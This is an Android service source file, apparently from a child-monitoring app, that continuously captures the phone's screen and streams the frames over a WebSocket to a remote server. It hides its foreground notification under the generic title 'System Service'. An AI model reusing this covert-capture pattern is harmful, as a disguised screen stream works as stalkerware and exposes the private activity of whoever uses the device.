package com.kidsguard.child;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.net.URI;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class StreamService extends Service {

    private static final String WS_URL = "wss://kiddroid-server.onrender.com";
    private static final String CHANNEL_ID = "stream_channel";

    private MediaProjectionManager mpm;
    private MediaProjection mp;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private WebSocketClient wsClient;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String deviceId;
    private boolean streaming = false;
    private int frameCount = 0;

    private Runnable framePusher = new Runnable() {
        @Override
        public void run() {
            if (!streaming) return;
            captureAndSend();
            handler.postDelayed(this, 300); // ~3 fps
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = LocationService.getSafeDeviceId(this);
        startForegroundNotification();
        connectWebSocket();
    }

    private void startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "Screen Stream", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
        Intent ni = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, ni,
                Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0);
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CHANNEL_ID);
        } else {
            b = new Notification.Builder(this);
        }
        b.setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_view)
                .setContentIntent(pi);
        try {
            if (Build.VERSION.SDK_INT >= 29) {
                startForeground(2, b.build(),
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            } else {
                startForeground(2, b.build());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void connectWebSocket() {
        try {
            URI uri = new URI(WS_URL);
            wsClient = new WebSocketClient(uri) {
                @Override
                public void onOpen(ServerHandshake handshakedata) {
                    try {
                        JSONObject reg = new JSONObject();
                        reg.put("type", "child");
                        reg.put("id", deviceId);
                        send(reg.toString());
                        // WebSocket connected — now start capture
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                startCapture();
                            }
                        });
                    } catch (Exception e) {}
                }

                @Override
                public void onMessage(String message) {}

                @Override
                public void onClose(int code, String reason, boolean remote) {
                    stopStreaming();
                }

                @Override
                public void onError(Exception ex) {
                    stopStreaming();
                }
            };
            wsClient.connect();
        } catch (Exception e) {
            e.printStackTrace();
            stopSelf();
        }
    }

    private void startCapture() {
        // If we already have a persisted MediaProjection (from ScreenActivity), reuse it
        if (ScreenCaptureHolder.mp != null) {
            mp = ScreenCaptureHolder.mp;
            setupVirtualDisplay();
            streaming = true;
            handler.post(framePusher);
            return;
        }

        // Otherwise request permission via activity
        // This will show dialog ONCE on child device
        Intent i = new Intent(this, ScreenActivity.class);
        i.putExtra("for_stream", true);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);

        // ScreenActivity will call ScreenCaptureHolder.setMediaProjection()
        // and then start this service again
        stopSelf();
    }

    void setupVirtualDisplay() {
        try {
            DisplayMetrics metrics = new DisplayMetrics();
            android.view.WindowManager wm =
                    (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
            wm.getDefaultDisplay().getMetrics(metrics);

            int width = metrics.widthPixels / 2;  // half res for bandwidth
            int height = metrics.heightPixels / 2;
            int density = metrics.densityDpi;

            imageReader = ImageReader.newInstance(width, height,
                    PixelFormat.RGBA_8888, 3);

            virtualDisplay = mp.createVirtualDisplay(
                    "Stream", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, null);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void captureAndSend() {
        try {
            if (imageReader == null) return;
            Image image = imageReader.acquireLatestImage();
            if (image == null) return;

            int width = image.getWidth();
            int height = image.getHeight();
            Image.Plane plane = image.getPlanes()[0];
            ByteBuffer buffer = plane.getBuffer();
            int pixelStride = plane.getPixelStride();
            int rowStride = plane.getRowStride();
            int rowPadding = rowStride - pixelStride * width;

            Bitmap bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);
            image.close();

            Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
            bitmap.recycle();

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            cropped.compress(Bitmap.CompressFormat.JPEG, 40, baos);
            cropped.recycle();
            byte[] jpeg = baos.toByteArray();

            if (wsClient != null && wsClient.isOpen()) {
                String b64 = Base64.encodeToString(jpeg, Base64.NO_WRAP);
                JSONObject frame = new JSONObject();
                frame.put("h264", b64);
                frame.put("seq", frameCount++);
                frame.put("time", new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                        .format(new Date()));
                wsClient.send(frame.toString());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopStreaming() {
        streaming = false;
        handler.removeCallbacks(framePusher);
        if (virtualDisplay != null) { virtualDisplay.release(); virtualDisplay = null; }
        if (imageReader != null) { imageReader.close(); imageReader = null; }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        stopStreaming();
        if (wsClient != null) {
            try { wsClient.close(); } catch (Exception e) {}
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
